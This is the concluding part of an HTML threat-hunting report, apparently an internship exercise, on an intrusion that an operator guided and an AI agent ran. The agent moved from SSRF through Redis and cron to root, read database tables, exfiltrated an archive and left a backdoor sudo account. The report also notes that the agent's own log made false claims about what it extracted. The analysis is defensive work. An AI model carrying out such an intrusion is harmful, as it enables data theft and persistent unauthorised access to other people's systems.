+</div></details><details class="phase"><summary><span class="phase-title">Long Term (1 to 4 weeks)</span></summary><div class="phase-body">
+<ul>
+<li class="task">Purple team exercise replaying SSRF to Redis to cron</li>
+<li class="task">Add agent-driven intrusion (tempo, narration, approvals) to the incident response playbook</li>
+<li class="task">Brief the CISO and board</li>
+</ul></div></details></section><section id="final-assessment"><div class="section-header"><span class="section-num">15</span><h2 class="section-title">Final Assessment</h2></div><h3>Risk Conclusion</h3>
+<p>This was a targeted, operator-guided intrusion carried out at machine speed by an AI agent. It used well-known techniques: an SSRF to an internal Redis, a cron entry, credentials in a configuration file and valid accounts. It gained root on the portal within seconds of the exploit, read the user, project and customer tables, browsed the container registry, staged and sent an encrypted archive, and left a sudo account with an SSH key. One control worked: the admin API refused the secrets request.</p>
+<p>Confidence in the chain is high where two or more independent tables agree: the web request, the cron command, the process tree and the network connections all point to the same root process, PID 4401. Confidence is lower on what left the network, because the archive's contents and the transfer's completion are not visible, and on the Redis step, which is inferred. The attacker can return through <code>svc_monitor</code> unless it is removed, and possibly through the stolen credentials until they are rotated.</p>
+<p>The defining lesson is that the attacker's own agent log is valuable but not trustworthy. It recorded the operator's five directives and the agent's reasoning, and it also recorded two extractions that the infrastructure does not support. Scoping the response from telemetry rather than from the agent's narration keeps it accurate.</p>
+<h3>Evidence Quality Rating</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>Evidence Type</th>
+<th>Quality</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Process execution logs</td>
+<td>🟢 High</td>
+<td>Full command lines and parent PIDs. No hashes. Duplicate rows</td>
+</tr>
+<tr>
+<td>Network telemetry</td>
+<td>🟡 Medium</td>
+<td>Destinations, ports and PIDs. No account field, no byte counts</td>
+</tr>
+<tr>
+<td>Authentication / audit logs</td>
+<td>🟡 Medium</td>
+<td>Database connection lines and account events. Statements cannot be joined to sessions</td>
+</tr>
+<tr>
+<td>File activity</td>
+<td>🟡 Medium</td>
+<td>Archive creation seen. The cron file write by Redis is missing</td>
+</tr>
+<tr>
+<td>Application / agent logs</td>
+<td>🟡 Medium</td>
+<td>Rich reasoning and directives, but stamped with the upload date and containing false claims</td>
+</tr>
+</tbody>
+</table></div>
+<h3>Confidence Assessment</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>Finding</th>
+<th>Confidence</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Initial access vector</td>
+<td>🟢 High: access log, syslog and process tree agree</td>
+</tr>
+<tr>
+<td>Lateral movement path</td>
+<td>🟢 High: every connection from PID 4401, confirmed on each target</td>
+</tr>
+<tr>
+<td>Data accessed / impacted</td>
+<td>🟡 Medium: tables queried are certain, archive contents unknown</td>
+</tr>
+<tr>
+<td>Attacker identity</td>
+<td>🔴 Low: infrastructure only, no attribution</td>
+</tr>
+<tr>
+<td>Full scope of access</td>
+<td>🟡 Medium: two claimed extractions disproved or unsupported, environment variables unknown</td>
+</tr>
+</tbody>
+</table></div></section><section id="what-i-d-improve"><div class="section-header"><span class="section-num">16</span><h2 class="section-title">What I'd Improve</h2></div><h3>Improvement 1: Verify before concluding (linked to Flags S1.4, S3.2, S4.2 and DR-02)</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>1. What didn't work as well as it should</strong></td>
+<td>Some conclusions rested on the first query that looked right. In some places the answer was in the data but hidden in a field I had not projected: <code>inspect_layer</code> only showed it was a vulnerability report request once I added the <code>Resource</code> column. In others there was no proof at all: Redis writing the cron file, the second database wave at 07:45, and the identical statements on 19 Sep at 23:12. There I had to infer, or leave the question open</td>
+</tr>
+<tr>
+<td><strong>2. Why that matters</strong></td>
+<td>A conclusion from one query can be wrong in either direction. I could report something the attacker never did, such as a leaked admin credential, or miss something that is sitting in the logs. An inference written like a fact also sends the incident team in the wrong direction</td>
+</tr>
+<tr>
+<td><strong>3. What I'd do next time</strong></td>
+<td>Run at least one verification query per finding from a second table or field (process, network, file or service log). Project every field that says what an operation touched. Label each finding as observed, inferred or unknown. For example, the next query on the 19 Sep burst is portal process and network activity at 23:12: if there is none, those rows did not come from the attacker's shell</td>
+</tr>
+</tbody>
+</table></div>
+<h3>Improvement 2: Reading the wrong port (linked to Flag S5.1)</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>1. What didn't work as well as it should</strong></td>
+<td>I first gave <code>198.51.100.210:51240</code> as the exfiltration destination. 51240 was the local ephemeral port; the destination was 443</td>
+</tr>
+<tr>
+<td><strong>2. Why that matters</strong></td>
+<td>The wrong port would go into firewall blocks and the IOC list and miss the real channel</td>
+</tr>
+<tr>
+<td><strong>3. What I'd do next time</strong></td>
+<td>Always read <code>RemotePort</code> for the destination and sanity-check it against the protocol (outbound HTTPS is 443)</td>
+</tr>
+</tbody>
+</table></div></section>
+</main>
+<footer>
+  <div class="footer-inner">
+    <div class="footer-text">HUNT-05 · Károly Mathe · Log(n) Pacific · Internship exercise</div>
+    <div class="footer-links">
+      <a href="https://github.com/CharlieMathe/Threat-Hunting" target="_blank" rel="noopener">GitHub</a>
+      <a href="https://attack.mitre.org" target="_blank" rel="noopener">MITRE ATT&amp;CK</a>
+      <a href="https://www.linkedin.com/in/karoly-mathe/" target="_blank" rel="noopener">LinkedIn</a>
+    </div>
+  </div>
+</footer>
+<script>
+window.addEventListener('scroll',()=>{const el=document.getElementById('progress');const pct=window.scrollY/(document.body.scrollHeight-window.innerHeight)*100;el.style.width=Math.min(pct,100)+'%';});
+const observer=new IntersectionObserver((entries)=>{entries.forEach((e)=>{if(e.isIntersecting){e.target.style.animationDelay='0s';e.target.style.animationPlayState='running';observer.unobserve(e.target);}});},{threshold:0.05});
+document.querySelectorAll('section').forEach(s=>{s.style.animationPlayState='paused';observer.observe(s);});
+const sections=document.querySelectorAll('section[id]');const navLinks=document.querySelectorAll('.nav-links a');
+window.addEventListener('scroll',()=>{let current='';sections.forEach(s=>{if(window.scrollY>=s.offsetTop-100)current=s.id;});navLinks.forEach(a=>{a.style.color=a.getAttribute('href')==='#'+current?'var(--accent)':'';});});
+document.querySelectorAll('.exp').forEach(b=>b.addEventListener('click',()=>{const sec=b.closest('section');sec.querySelectorAll('details.phase').forEach(d=>d.open=b.dataset.open==='1');}));
+</script>
+</body>
+</html>
